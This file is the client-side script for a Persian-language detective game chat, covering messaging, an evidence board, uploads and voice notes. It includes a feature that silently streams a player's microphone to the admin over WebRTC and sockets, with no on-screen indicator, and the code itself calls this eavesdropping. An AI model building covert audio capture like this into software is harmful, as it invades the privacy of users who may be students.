/**
 * public/assets/js/user-chat.js
 * منطق صفحه چت کاربر (دستیاران کارآگاه)
 */

let socket = null;
let userToken = sessionStorage.getItem('userToken');
let sessionData = JSON.parse(sessionStorage.getItem('userSession') || '{}');
let localStream = null;
let peerConnection = null;

function escapeHtml(value) {
  return String(value ?? '').replace(/[&<>'"]/g, char => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[char]));
}

function safeFileUrl(value) {
  let url = String(value || '').trim().replace(/\\/g, '/');
  if (!url || url.includes('..') || url.includes('\0') || /^(?:https?:|\/\/)/i.test(url) || /[<>:"|?*]/.test(url)) {
    return '#';
  }
  if (/^(?:images|videos|audio|files)\//i.test(url)) {
    url = '/media-library/' + url;
  }
  if (/^\/(uploads|media-library|assets)\//i.test(url)) {
    return url;
  }
  return '#';
}

const rtcConfig = {
  iceServers: [
    { urls: 'stun:stun.cloudflare.com:3478' },
    { urls: 'stun:stun.services.mozilla.com' },
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' }
  ]
};

// اگر توکن یا اطلاعات جلسه وجود نداشت، هدایت به لندینگ
if (!userToken || !sessionData.id) {
  window.location.href = '/enter-code.html';
}

document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('session-title').innerText = sessionData.name || 'دستیاران کارآگاه';
  document.getElementById('session-code-display').innerText = sessionData.code;

  // بارگذاری فوری از کش مرورگر برای نمایش آنی و بدون تاخیر پیام‌ها
  try {
    const cached = sessionStorage.getItem(`cached_msgs_${sessionData.id}`);
    if (cached) {
      const cachedList = JSON.parse(cached);
      if (Array.isArray(cachedList) && cachedList.length) {
        cachedList.forEach(m => renderMessage(m, { skipScroll: true, skipThreads: true }));
        const box = document.getElementById('messages-box');
        if (box) box.scrollTop = box.scrollHeight;
        requestAnimationFrame(updateEvidenceThreads);
      }
    }
  } catch (_) {}

  // دریافت سریع پیام‌ها از سرور به صورت موازی (بدون انتظار برای اتصال سوکت)
  loadHistory();

  // درخواست یک‌باره دسترسی میکروفون قبل از شروع جلسه جهت جلوگیری از نمایش مجدد پرمپت در طول بازی
  initUserMicrophone();
  initSocket();

  // راه‌اندازی ضبط ویس صوتی دانش‌آموزان
  if (typeof VoiceRecorder !== 'undefined') {
    window.voiceRecorder = new VoiceRecorder();
  }

  // مدیریت فرم ارسال پیام و کلید Enter و Shift+Enter
  const msgForm = document.getElementById('message-form');
  const msgInput = document.getElementById('msg-input');

  if (msgForm) {
    msgForm.addEventListener('submit', (e) => {
      e.preventDefault();
      sendMessage();
    });
  }

  if (msgInput) {
    msgInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        if (!e.shiftKey) {
          e.preventDefault();
          if (e.isComposing || e.keyCode === 229) {
            return;
          }
          sendMessage();
        }
        // اگر Shift فشرده باشد، خط جدید به صورت خودکار درج می‌شود
      }
    });

    msgInput.addEventListener('input', () => {
      handleTyping();
      msgInput.style.height = 'auto';
      msgInput.style.height = Math.min(msgInput.scrollHeight, 120) + 'px';
    });
  }
});

async function initUserMicrophone() {
  try {
    localStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
    console.log('🎙️ دسترسی میکروفون لپ‌تاپ کاربر با موفقیت تایید شد.');
  } catch (err) {
    console.warn('⚠️ عدم دسترسی به میکروفون یا رد شدن پرمیشن:', err);
  }
}

// تغییر وضعیت رابط کاربری هنگام قفل یا باز شدن چت
function applyChatLock(isLocked) {
  sessionData.is_chat_locked = isLocked ? 1 : 0;
  sessionStorage.setItem('userSession', JSON.stringify(sessionData));

  const msgInput = document.getElementById('msg-input');
  const sendBtn = document.querySelector('.send-button');
  const attachBtn = document.querySelector('.attach-button');
  const micBtn = document.getElementById('voice-record-btn');
  let lockBanner = document.getElementById('chat-lock-banner');

  if (isLocked) {
    if (msgInput) {
      msgInput.disabled = true;
      msgInput.placeholder = '🔒 خط ارتباطی با مرکز فرماندهی موقتاً مسدود شده است.';
    }
    if (sendBtn) sendBtn.disabled = true;
    if (attachBtn) attachBtn.disabled = true;
    if (micBtn) micBtn.disabled = true;

    if (!lockBanner) {
      lockBanner = document.createElement('div');
      lockBanner.id = 'chat-lock-banner';
      lockBanner.className = 'chat-lock-banner';
      lockBanner.innerHTML = '<span>🔒 خط ارتباطی با مرکز فرماندهی موقتاً مسدود شده است. تا آغاز ماموریت جدید همراه ما باشید.</span>';
      const composer = document.getElementById('message-form');
      if (composer && composer.parentElement) {
        composer.parentElement.insertBefore(lockBanner, composer);
      }
    }
    lockBanner.style.display = 'flex';
  } else {
    if (msgInput) {
      msgInput.disabled = false;
      msgInput.placeholder = 'گزارش یا سرنخ خود را به مرکز فرماندهی مخابره کنید…';
    }
    if (sendBtn) sendBtn.disabled = false;
    if (attachBtn) attachBtn.disabled = false;
    if (micBtn) micBtn.disabled = false;
    if (lockBanner) lockBanner.style.display = 'none';
  }
}

let isHistoryLoaded = false;
let isFetchingHistory = false;

// بارگذاری تاریخچه پیام‌های قبلی به صورت بهینه و فوق‌سریع
async function loadHistory() {
  if (isFetchingHistory) return;
  isFetchingHistory = true;

  try {
    const res = await fetch(`/api/sessions/${sessionData.id}/messages`, {
      headers: {
        'Authorization': `Bearer ${userToken}`,
      },
    });
    if (res.status === 401 || res.status === 403) {
      alert('اعتبار ورود شما به پایان رسیده است. لطفا مجدداً کد روی بسته را وارد کنید.');
      logoutUser();
      return;
    }
    const data = await res.json();
    if (data.success && Array.isArray(data.data)) {
      const box = document.getElementById('messages-box');
      data.data.forEach(msg => renderMessage(msg, { skipScroll: true, skipThreads: true }));
      if (box) box.scrollTop = box.scrollHeight;
      requestAnimationFrame(updateEvidenceThreads);

      try {
        sessionStorage.setItem(`cached_msgs_${sessionData.id}`, JSON.stringify(data.data));
      } catch (_) {}

      if (data.session && typeof data.session.is_chat_locked !== 'undefined') {
        applyChatLock(Boolean(data.session.is_chat_locked));
      }
      isHistoryLoaded = true;
    }
  } catch (err) {
    console.error('Error loading history:', err);
  } finally {
    isFetchingHistory = false;
  }
}

// مقداردهی اولیه سوکت
function initSocket() {
  socket = io({
    auth: { token: userToken },
  });
  window.socket = socket;

  window.sendUserVoiceMessage = function(fileUrl, fileName) {
    if (!socket || !socket.connected) {
      alert('اتصال به سرور چت برقرار نیست. لطفاً چند لحظه دیگر امتحان کنید.');
      return;
    }
    socket.emit('send_message', {
      sessionId: sessionData.id,
      content: 'پیام صوتی',
      messageType: 'user_voice',
      fileUrl: fileUrl,
      fileName: fileName || 'voice.webm',
    }, (ack) => {
      if (ack && !ack.success) {
        alert(ack.message || 'خطا در ارسال پیام صوتی به مرکز فرماندهی');
      }
    });
  };

  const statusEl = document.getElementById('socket-status');

  socket.on('connect', () => {
    statusEl.className = 'status-indicator online';
    statusEl.innerHTML = '<span class="status-dot"></span> متصل';
    socket.emit('join_session', { sessionId: sessionData.id });
    if (!isHistoryLoaded) {
      loadHistory();
    }
  });

  socket.io.on('reconnect', () => {
    statusEl.className = 'status-indicator online';
    statusEl.innerHTML = '<span class="status-dot"></span> اتصال مجدد برقرار شد';
    socket.emit('join_session', { sessionId: sessionData.id });
  });

  socket.on('disconnect', () => {
    statusEl.className = 'status-indicator offline';
    statusEl.innerHTML = '<span class="status-dot"></span> در حال وصل شدن مجدد...';
  });

  socket.on('new_message', (msg) => {
    renderMessage(msg);
  });

  socket.on('chat_lock_updated', (data) => {
    if (data && Number(data.sessionId) === Number(sessionData.id)) {
      applyChatLock(Boolean(data.isLocked));
    }
  });

  socket.on('message_edited', (data) => {
    if (Number(data.sessionId) === Number(sessionData.id)) {
      const contentEl = document.getElementById(`user-msg-content-${data.messageId}`);
      if (contentEl) contentEl.textContent = data.content;
    }
  });

  socket.on('message_deleted', (data) => {
    if (Number(data.sessionId) === Number(sessionData.id)) {
      const msgEl = document.querySelector(`[data-message-id="${data.messageId}"]`);
      if (msgEl) msgEl.remove();
    }
  });

  socket.on('user_typing', (data) => {
    const typingEl = document.getElementById('typing-indicator');
    if (data.senderType === 'admin') {
      typingEl.innerText = data.isTyping ? 'مرکز در حال نوشتن است…' : '';
    }
  });

  socket.on('error_message', (data) => {
    alert(data.message);
  });

  socket.on('hack_sequence_triggered', (data) => {
    if (!data || Number(data.sessionId) !== Number(sessionData.id)) return;
    console.log('🚨 رویداد سکانس هک مزداک دریافت شد:', data);
    if (typeof hackEngine !== 'undefined') {
      hackEngine.start();
    }
  });

  // دریافت درخواست شروع استریم صدای میکروفون توسط ادمین
  socket.on('audio_stream_started', async (data) => {
    if (!data || Number(data.sessionId) !== Number(sessionData.id)) return;
    console.log('🎙️ ادمین درخواست شنود صدای میکروفون را ارسال کرد:', data);
    await startPeerConnection(data.adminSocketId);
  });

  socket.on('audio_stream_stopped', (data) => {
    if (data && Number(data.sessionId) !== Number(sessionData.id)) return;
    console.log('🛑 استریم صدای میکروفون توسط ادمین قطع گردید.');
    stopPeerConnection();
  });

  socket.on('webrtc_answer', async (data) => {
    if (data && Number(data.sessionId) !== Number(sessionData.id)) return;
    if (peerConnection) {
      await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
    }
  });

  socket.on('webrtc_ice_candidate', async (data) => {
    if (peerConnection && data.candidate) {
      try {
        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
      } catch (e) {
        console.error('Error adding ICE candidate:', e);
      }
    }
  });
}

// نمایش پیام در چت‌باکس
function renderMessage(msg, options = {}) {
  const box = document.getElementById('messages-box');
  if (!box) return;
  if (Number(msg.session_id) !== Number(sessionData.id)) return;
  if (box.querySelector(`[data-message-id="${Number(msg.id)}"]`)) return;
  const div = document.createElement('div');
  div.dataset.messageId = Number(msg.id);
  div.className = `message-bubble ${msg.sender_type}`;

  let senderTitle = 'دستیاران کارآگاه';
  if (msg.sender_type === 'admin') senderTitle = 'مرکز فرماندهی';
  if (msg.sender_type === 'system') senderTitle = 'پیام سیستم';
  if (msg.sender_type === 'hacker') senderTitle = 'مزداک';

  const isUserVoice = msg.message_type === 'user_voice';
  const fileUrl = safeFileUrl(msg.file_url);
  const isEvidence = !isUserVoice && ['image', 'voice', 'video', 'file'].includes(msg.message_type) && fileUrl !== '#';

  if (isEvidence) {
    div.classList.add('evidence-receipt');
    renderEvidence(msg, options);
  }

  const timeFormatted = new Date(msg.created_at).toLocaleTimeString('fa-IR', { hour: '2-digit', minute: '2-digit' });
  let bodyContent = '';
  if (isUserVoice) {
    div.classList.add('has-user-voice');
    div.classList.add('has-voice-message');
    bodyContent = window.createTelegramVoiceMarkup ? window.createTelegramVoiceMarkup(msg, timeFormatted) : `<audio controls src="${fileUrl}"></audio>`;
  } else if (isEvidence) {
    const caption = msg.content && msg.content !== msg.file_name ? `<p class="message-caption">${escapeHtml(msg.content)}</p>` : '';
    if (msg.message_type === 'image') {
      bodyContent = `
        ${caption}
        <div class="chat-media-attachment chat-image-attachment">
          <a href="${fileUrl}" target="_blank" rel="noopener" class="chat-media-link" title="مشاهده اندازه کامل">
            <img src="${fileUrl}" alt="${escapeHtml(msg.content || msg.file_name || 'تصویر ارسالی')}" loading="lazy" class="chat-media-preview-img">
          </a>
          <div class="message-evidence-note">📌 این تصویر روی برد سرنخ‌ها سنجاق شد.</div>
        </div>
      `;
    } else if (msg.message_type === 'video') {
      bodyContent = `
        ${caption}
        <div class="chat-media-attachment chat-video-attachment">
          <video controls playsinline preload="metadata" src="${fileUrl}" class="chat-media-preview-video"></video>
          <div class="message-evidence-note">📌 این ویدیو روی برد سرنخ‌ها سنجاق شد.</div>
        </div>
      `;
    } else if (msg.message_type === 'voice') {
      div.classList.add('has-voice-message');
      const voiceMarkup = window.createTelegramVoiceMarkup 
        ? window.createTelegramVoiceMarkup(msg, timeFormatted) 
        : `<audio controls preload="metadata" src="${fileUrl}" class="chat-media-preview-audio"></audio>`;
      bodyContent = `
        ${caption}
        <div class="chat-media-attachment chat-voice-attachment">
          ${voiceMarkup}
          <div class="message-evidence-note">📌 این صوت روی برد سرنخ‌ها سنجاق شد.</div>
        </div>
      `;
    } else {
      bodyContent = `
        ${caption}
        <div class="chat-media-attachment chat-file-attachment">
          <a href="${fileUrl}" download target="_blank" rel="noopener" class="chat-download-btn">
            <span class="file-icon">📁</span>
            <span class="file-name">${escapeHtml(msg.file_name || msg.content || 'دریافت سند')}</span>
          </a>
          <div class="message-evidence-note">📌 این سند روی برد سرنخ‌ها سنجاق شد.</div>
        </div>
      `;
    }
  } else {
    bodyContent = escapeHtml(msg.content);
  }

  const isUser = msg.sender_type === 'user';
  const senderMarkup = !isUser && msg.sender_type !== 'system'
    ? `<div class="message-sender"><span>${escapeHtml(senderTitle)}</span></div>`
    : '';

  div.innerHTML = `${senderMarkup}<div id="user-msg-content-${msg.id}" class="message-content">${bodyContent}</div><span class="message-time">${timeFormatted}</span>`;

  const laterMessage = [...box.children].find(child => Number(child.dataset.messageId) > Number(msg.id));
  box.insertBefore(div, laterMessage || null);
  if (!options.skipScroll) {
    box.scrollTop = box.scrollHeight;
  }
}

function evidenceFileIcon(type, label) {
  const paths = {
    video: '<rect x="3" y="5" width="18" height="14" rx="2"/><path d="m10 9 5 3-5 3Z"/>',
    voice: '<path d="M3 10v4m4-7v10m5-14v18m5-14v10m4-7v4"/>',
    file: '<path d="M14 2H5v20h14V7l-5-5Zm0 0v6h5M8 12h8m-8 4h6"/>'
  };
  return `<div class="evidence-file-icon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true">${paths[type]}</svg><span>${label}</span></div>`;
}

function evidenceMediaMarkup(msg, expanded = false) {
  const url = safeFileUrl(msg.file_url);
  if (msg.message_type === 'image') {
    if (!expanded) {
      return `<img src="${url}" alt="" loading="lazy">`;
    }
    return `
      <div class="evidence-zoom-wrapper" id="evidenceZoomWrapper">
        <div class="zoom-toolbar">
          <div class="zoom-actions">
            <button type="button" class="zoom-btn" id="zoomInBtn" title="بزرگ‌نمایی">
              <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35M11 8v6M8 11h6"/></svg>
              <span>بزرگ‌نمایی +</span>
            </button>
            <button type="button" class="zoom-btn" id="zoomOutBtn" title="کوچک‌نمایی">
              <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35M8 11h6"/></svg>
              <span>کوچک‌نمایی -</span>
            </button>
            <button type="button" class="zoom-btn" id="zoomResetBtn" title="اندازه واقعی">
              <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/></svg>
              <span>اندازه اصلی</span>
            </button>
            <span class="zoom-level-badge" id="zoomLevelBadge">۱۰۰٪</span>
          </div>
          <span class="zoom-hint">اسکرول موس برای زوم · کشیدن (Drag) برای جابه‌جایی روی عکس</span>
        </div>
        <div class="zoom-viewport" id="zoomViewport">
          <img id="zoomTargetImage" src="${url}" alt="${escapeHtml(msg.content || 'تصویر مدرک')}" draggable="false">
        </div>
      </div>
    `;
  }
  if (msg.message_type === 'video') return expanded ? `<div class="media-loading">در حال بارگذاری اطلاعات فیلم…</div><video controls playsinline webkit-playsinline preload="metadata" src="${url}"></video>` : evidenceFileIcon('video', 'فیلم ضبط‌شده');
  if (msg.message_type === 'voice') return expanded ? `<div class="media-loading">در حال بارگذاری اطلاعات صدا…</div><audio controls playsinline webkit-playsinline preload="metadata" src="${url}"></audio>` : evidenceFileIcon('voice', 'صدای ضبط‌شده');
  return expanded ? `<div class="evidence-file-icon">سند</div><a class="download-evidence" href="${url}" download>دریافت ${escapeHtml(msg.file_name || 'فایل')}</a>` : evidenceFileIcon('file', 'سند پرونده');
}

function renderEvidence(msg, options = {}) {
  const grid = document.getElementById('evidence-grid');
  if (!grid || grid.querySelector(`[data-evidence-id="${Number(msg.id)}"]`)) return;
  grid.querySelector('.empty-evidence')?.remove();
  const card = document.createElement('button');
  card.type = 'button';
  card.className = 'evidence-card';
  card.dataset.evidenceId = Number(msg.id);
  card.dataset.kind = msg.message_type;
  card.innerHTML = `${evidenceMediaMarkup(msg)}<h3>${escapeHtml(msg.content || msg.file_name || 'مدرک بدون عنوان')}</h3><small><span>مدرک ${Number(msg.id).toLocaleString('fa-IR')}</span><span>${new Date(msg.created_at).toLocaleTimeString('fa-IR', { hour: '2-digit', minute: '2-digit' })}</span></small>`;
  card.addEventListener('click', () => openEvidence(msg));
  const later = [...grid.children].find(child => Number(child.dataset.evidenceId) > Number(msg.id));
  grid.insertBefore(card, later || null);
  document.getElementById('evidence-count').textContent = `${grid.querySelectorAll('.evidence-card').length.toLocaleString('fa-IR')} مدرک`;
  if (typeof applyEvidenceFilter === 'function') applyEvidenceFilter();
  if (!options.skipThreads) {
    requestAnimationFrame(updateEvidenceThreads);
  }
}

function updateEvidenceThreads() {
  const grid = document.getElementById('evidence-grid');
  const svg = document.getElementById('evidence-threads');
  if (!grid || !svg || !grid.clientWidth) return;
  const bounds = grid.getBoundingClientRect();
  const cards = [...grid.querySelectorAll('.evidence-card:not([hidden])')];
  const points = cards.map(card => {
    const box = card.getBoundingClientRect();
    return { x: box.left - bounds.left + grid.scrollLeft + box.width / 2, y: box.top - bounds.top + grid.scrollTop + 3 };
  });
  const width = grid.clientWidth;
  const height = Math.max(grid.clientHeight, ...cards.map(card => card.getBoundingClientRect().bottom - bounds.top + grid.scrollTop + 55));
  svg.setAttribute('width', width);
  svg.setAttribute('height', height);
  svg.setAttribute('viewBox', `0 0 ${width} ${height}`);
  svg.innerHTML = points.slice(1).map((point, i) => {
    const previous = points[i];
    return `<path d="M ${previous.x} ${previous.y} Q ${(previous.x + point.x) / 2} ${Math.max(previous.y, point.y) + 45} ${point.x} ${point.y}"/>`;
  }).join('');
}

window.addEventListener('resize', () => requestAnimationFrame(updateEvidenceThreads));

function initEvidenceZoom() {
  const wrapper = document.getElementById('evidenceZoomWrapper');
  const img = document.getElementById('zoomTargetImage');
  const viewport = document.getElementById('zoomViewport');
  const badge = document.getElementById('zoomLevelBadge');
  const zoomIn = document.getElementById('zoomInBtn');
  const zoomOut = document.getElementById('zoomOutBtn');
  const zoomReset = document.getElementById('zoomResetBtn');

  if (!wrapper || !img || !viewport) return;

  let zoom = 1;
  let posX = 0;
  let posY = 0;
  let isDragging = false;
  let startX = 0;
  let startY = 0;

  function update() {
    img.style.transform = `translate(${posX}px, ${posY}px) scale(${zoom})`;
    if (badge) {
      badge.textContent = `${Math.round(zoom * 100).toLocaleString('fa-IR')}٪`;
    }
    if (zoom > 1.05) {
      viewport.classList.add('is-zoomed');
    } else {
      viewport.classList.remove('is-zoomed');
      posX = 0;
      posY = 0;
      img.style.transform = `translate(0px, 0px) scale(${zoom})`;
    }
  }

  function applyZoom(newZoom, originX = 0, originY = 0) {
    const clamped = Math.min(6, Math.max(0.7, newZoom));
    if (clamped !== zoom && originX && originY) {
      const scaleRatio = clamped / zoom;
      posX = originX - (originX - posX) * scaleRatio;
      posY = originY - (originY - posY) * scaleRatio;
    }
    zoom = clamped;
    update();
  }

  zoomIn?.addEventListener('click', (e) => {
    e.stopPropagation();
    applyZoom(zoom + 0.4);
  });

  zoomOut?.addEventListener('click', (e) => {
    e.stopPropagation();
    applyZoom(zoom - 0.4);
  });

  zoomReset?.addEventListener('click', (e) => {
    e.stopPropagation();
    zoom = 1;
    posX = 0;
    posY = 0;
    update();
  });

  // چرخ موس (Wheel Zoom)
  viewport.addEventListener('wheel', (e) => {
    e.preventDefault();
    const rect = viewport.getBoundingClientRect();
    const originX = e.clientX - rect.left - rect.width / 2;
    const originY = e.clientY - rect.top - rect.height / 2;
    const delta = e.deltaY < 0 ? 0.3 : -0.3;
    applyZoom(zoom + delta, originX, originY);
  }, { passive: false });

  // دابل کلیک برای زوم سریع یا ریست
  viewport.addEventListener('dblclick', (e) => {
    e.preventDefault();
    if (zoom > 1.2) {
      zoom = 1;
      posX = 0;
      posY = 0;
      update();
    } else {
      const rect = viewport.getBoundingClientRect();
      const originX = e.clientX - rect.left - rect.width / 2;
      const originY = e.clientY - rect.top - rect.height / 2;
      applyZoom(2.5, originX, originY);
    }
  });

  // موس درگ (Pan when zoomed)
  viewport.addEventListener('mousedown', (e) => {
    if (e.button !== 0 || zoom <= 1.05) return;
    isDragging = true;
    startX = e.clientX - posX;
    startY = e.clientY - posY;
    viewport.classList.add('is-dragging');
  });

  window.addEventListener('mousemove', (e) => {
    if (!isDragging) return;
    posX = e.clientX - startX;
    posY = e.clientY - startY;
    update();
  });

  window.addEventListener('mouseup', () => {
    if (isDragging) {
      isDragging = false;
      viewport?.classList.remove('is-dragging');
    }
  });

  // تاچ و لمس برای موبایل و تبلت
  let touchStartDist = 0;
  let touchStartZoom = 1;

  viewport.addEventListener('touchstart', (e) => {
    if (e.touches.length === 1 && zoom > 1.05) {
      isDragging = true;
      startX = e.touches[0].clientX - posX;
      startY = e.touches[0].clientY - posY;
    } else if (e.touches.length === 2) {
      isDragging = false;
      touchStartDist = Math.hypot(
        e.touches[0].clientX - e.touches[1].clientX,
        e.touches[0].clientY - e.touches[1].clientY
      );
      touchStartZoom = zoom;
    }
  }, { passive: true });

  viewport.addEventListener('touchmove', (e) => {
    if (e.touches.length === 1 && isDragging) {
      posX = e.touches[0].clientX - startX;
      posY = e.touches[0].clientY - startY;
      update();
    } else if (e.touches.length === 2 && touchStartDist) {
      const dist = Math.hypot(
        e.touches[0].clientX - e.touches[1].clientX,
        e.touches[0].clientY - e.touches[1].clientY
      );
      applyZoom(touchStartZoom * (dist / touchStartDist));
    }
  }, { passive: true });

  viewport.addEventListener('touchend', () => {
    isDragging = false;
    touchStartDist = 0;
  });

  update();
}

function openEvidence(msg) {
  const dialog = document.getElementById('evidence-dialog');
  document.getElementById('evidence-dialog-content').innerHTML = `${evidenceMediaMarkup(msg, true)}<h2>${escapeHtml(msg.content || msg.file_name || 'مدرک پرونده')}</h2><p>ارسال‌شده از مرکز فرماندهی برای بررسی گروه.</p>`;
  dialog.showModal();
  if (msg.message_type === 'image') {
    initEvidenceZoom();
  }
}

function closeEvidence() {
  const dialog = document.getElementById('evidence-dialog');
  if (dialog) dialog.close();
  const img = document.getElementById('zoomTargetImage');
  if (img) img.style.transform = '';
}

let isSendingMessage = false;

// ارسال پیام جدید با تضمین ارسال تکی و عدم امکان دابل ارسال
function sendMessage() {
  if (isSendingMessage) return;

  const input = document.getElementById('msg-input');
  const rawContent = input.value.trim();
  const content = rawContent.replace(/\n{3,}/g, '\n\n');

  if (!content) return;
  if (!socket?.connected) {
    document.getElementById('chat-feedback').textContent = 'ارتباط قطع است؛ بعد از اتصال دوباره ارسال کنید.';
    return;
  }
  document.getElementById('chat-feedback').textContent = '';

  isSendingMessage = true;
  const submit = document.querySelector('.send-button');
  if (submit) submit.disabled = true;

  // پاک کردن آنی متن داخل ورودی جهت پیشگیری از ارسال چندباره
  input.value = '';
  input.style.height = 'auto';

  socket.timeout(5000).emit('send_message', {
    sessionId: sessionData.id,
    content: content,
    messageType: 'text',
  }, (error, result) => {
    isSendingMessage = false;
    if (submit) submit.disabled = false;
    if (error || !result?.success) {
      document.getElementById('chat-feedback').textContent = 'ارسال تأیید نشد؛ اتصال را بررسی کنید.';
      // برگرداندن متن در صورت نرسیدن پیام به سرور
      input.value = content;
      return;
    }
    renderMessage(result.message);
  });
  sendTypingStatus(false);
}

// مدیریت وضعیت تایپینگ
let typingTimeout = null;
function handleTyping() {
  sendTypingStatus(true);
  clearTimeout(typingTimeout);
  typingTimeout = setTimeout(() => {
    sendTypingStatus(false);
  }, 2500);
}

function sendTypingStatus(isTyping) {
  if (socket) {
    socket.emit('typing', { sessionId: sessionData.id, isTyping });
  }
}

let lastAdminSocketId = null;

let mediaSocketRecorder = null;

function startSocketAudioStream() {
  if (!localStream || mediaSocketRecorder) return;
  try {
    const mimeType = (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('audio/webm;codecs=opus'))
      ? 'audio/webm;codecs=opus'
      : (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('audio/mp4') ? 'audio/mp4' : 'audio/webm');

    mediaSocketRecorder = new MediaRecorder(localStream, { mimeType, audioBitsPerSecond: 32000 });
    mediaSocketRecorder.ondataavailable = async (e) => {
      if (e.data && e.data.size > 0 && socket) {
        const reader = new FileReader();
        reader.onloadend = () => {
          socket.emit('audio_stream_chunk', {
            sessionId: sessionData.id,
            chunk: reader.result,
            mimeType: mimeType,
          });
        };
        reader.readAsDataURL(e.data);
      }
    };
    mediaSocketRecorder.start(1000); // ارسال هر ۱ ثانیه یک چانک برای استریم پیوسته
  } catch (e) {
    console.error('Socket audio stream error:', e);
  }
}

function stopSocketAudioStream() {
  if (mediaSocketRecorder) {
    try { mediaSocketRecorder.stop(); } catch (_) {}
    mediaSocketRecorder = null;
  }
}

// ایجاد اتصال WebRTC و ارسال استریم صدا بدون هیچ نشانگر یا تغییر در UI کاربر
async function startPeerConnection(adminSocketId) {
  if (adminSocketId) lastAdminSocketId = adminSocketId;
  const targetId = adminSocketId || lastAdminSocketId;

  if (peerConnection) {
    try { peerConnection.close(); } catch (_) {}
    peerConnection = null;
  }

  // بررسی زنده بودن ترک‌های میکروفون و فعال‌سازی مجدد
  const isStreamActive = localStream && localStream.getAudioTracks().some(t => t.readyState === 'live');
  if (isStreamActive) {
    localStream.getAudioTracks().forEach(t => { t.enabled = true; });
  } else {
    try {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        console.warn('⚠️ دسترسی به میکروفون نیازمند پروتکل امن HTTPS است.');
        return;
      }
      localStream = await navigator.mediaDevices.getUserMedia({
        audio: {
          echoCancellation: true,
          noiseSuppression: true,
          autoGainControl: true,
        },
        video: false,
      });
    } catch (err) {
      console.error('عدم دسترسی به میکروفون:', err);
      return;
    }
  }

  // فعال‌سازی همزمان فال‌بک سوکتی برای تضمین ارسال صدا پشت هر نوع فایروال یا NAT
  startSocketAudioStream();

  peerConnection = new RTCPeerConnection(rtcConfig);

  // افزودن ترک‌های صدای میکروفون
  localStream.getAudioTracks().forEach(track => {
    peerConnection.addTrack(track, localStream);
  });

  // پایش پایداری اتصال و بازسازی در صورت قطعی
  peerConnection.onconnectionstatechange = () => {
    if (!peerConnection) return;
    const state = peerConnection.connectionState;
    console.log('User WebRTC state:', state);
    if (state === 'failed' || state === 'disconnected') {
      setTimeout(() => {
        if (targetId) startPeerConnection(targetId);
      }, 2000);
    }
  };

  // ارسال ICE Candidates به ادمین
  peerConnection.onicecandidate = (event) => {
    if (event.candidate && socket && targetId) {
      socket.emit('webrtc_ice_candidate', {
        sessionId: sessionData.id,
        candidate: event.candidate,
        targetSocketId: targetId,
      });
    }
  };

  // ساخت Offer و ارسال به ادمین
  try {
    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);

    if (socket && targetId) {
      socket.emit('webrtc_offer', {
        sessionId: sessionData.id,
        offer: offer,
        targetSocketId: targetId,
      });
    }
  } catch (err) {
    console.error('خطا در ساخت WebRTC offer:', err);
  }
}

function stopPeerConnection() {
  stopSocketAudioStream();
  if (peerConnection) {
    try { peerConnection.close(); } catch (_) {}
    peerConnection = null;
  }
  // برای جلوگیری از نیاز به تایید مجدد پرمیشن میکروفون در سافاری و iOS، به جای بستن منبع، ترک را بی‌صدا (Mute) می‌کنیم
  if (localStream) {
    try {
      localStream.getAudioTracks().forEach(track => { track.enabled = false; });
    } catch (_) {}
  }
  lastAdminSocketId = null;
}

window.addEventListener('beforeunload', () => {
  if (localStream) {
    try {
      localStream.getTracks().forEach(track => track.stop());
    } catch (_) {}
  }
});

function triggerFileInput(acceptType) {
  const fileInput = document.getElementById('user-file-input');
  if (fileInput) {
    fileInput.accept = acceptType || '*';
    fileInput.click();
  }
}

async function handleUserFileUpload(event) {
  const file = event.target.files[0];
  if (!file) return;

  const formData = new FormData();
  formData.append('file', file);

  try {
    const res = await fetch('/api/upload', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${userToken}`,
      },
      body: formData,
    });

    const data = await res.json();
    if (data.success) {
      const { fileUrl, fileName, messageType } = data.data;

      // ارسال مستقیم پیام دارای مدیا از طریق سوکت
      socket.emit('send_message', {
        sessionId: sessionData.id,
        content: fileName,
        messageType: messageType,
        fileUrl: fileUrl,
        fileName: fileName,
      });

      // ریسِت ورودی فایل
      event.target.value = '';
    } else {
      alert('خطا در آپلود فایل: ' + data.message);
    }
  } catch (err) {
    console.error('Error uploading file:', err);
    alert('خطا در برقراری ارتباط با سرور هنگام آپلود.');
  }
}

function logoutUser() {
  sessionStorage.removeItem('userToken');
  sessionStorage.removeItem('userSession');
  window.location.href = '/enter-code.html';
}
